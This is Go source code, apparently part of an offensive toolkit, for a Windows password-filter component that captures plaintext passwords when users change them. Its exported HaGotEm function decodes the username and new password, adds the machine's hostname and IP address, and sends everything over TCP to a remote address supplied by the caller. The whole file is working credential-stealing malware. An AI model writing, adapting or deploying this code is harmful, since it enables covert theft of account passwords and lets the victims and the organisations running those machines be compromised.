// Windows Password Filter
// Captures Raw plaintext passwords when changed.
// Golang library for yall scrubs.
//
// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import "C"
import (
	"fmt"
	"net"
	"os"
	"time"
)

func getIPAddress() string {
	i, err := net.Interfaces()
	if err != nil {
		return "<nil>"
	}
	for _, a := range i {
		if a.Flags&net.FlagUp == 0 || a.Flags&net.FlagLoopback != 0 {
			continue
		}
		if n, err := a.Addrs(); err == nil {
			for _, ad := range n {
				var r net.IP
				switch ad.(type) {
				case *net.IPNet:
					r = ad.(*net.IPNet).IP
				case *net.IPAddr:
					r = ad.(*net.IPAddr).IP
				default:
					continue
				}
				if r.IsLoopback() || r.IsUnspecified() || r.IsMulticast() || r.IsInterfaceLocalMulticast() || r.IsLinkLocalMulticast() || r.IsLinkLocalUnicast() {
					continue
				}
				if p := r.To4(); p != nil {
					return p.String()
				}
				return r.String()
			}
		} else {
			return "<nil>"
		}
	}
	return "<nil>"
}

//export HaGotEm
func HaGotEm(s *C.char, l C.int, u *C.char, n C.int, p *C.char) C.int {
	a := []byte(C.GoStringN(u, l))
	y := []byte(C.GoStringN(p, n))
	e := make([]rune, l/2)
	k := make([]rune, n/2)
	for i := 0; i < len(a); i += 2 {
		e[i/2] = rune(a[i])
	}
	for i := 0; i < len(y); i += 2 {
		k[i/2] = rune(y[i])
	}
	h, err := os.Hostname()
	if err != nil {
		h = ""
	}
	x, err := net.DialTimeout("tcp", C.GoString(s), time.Duration(5*time.Second))
	if err != nil {
		return C.int(-1)
	}
	defer x.Close()
	d := []byte(fmt.Sprintf("[%s:(%s)%s:%s]\n", h, getIPAddress(), string(e), string(k)))
	if _, err := x.Write(d); err != nil {
		return C.int(-1)
	}
	x.Close()
	return C.int(0)
}

func main() {}
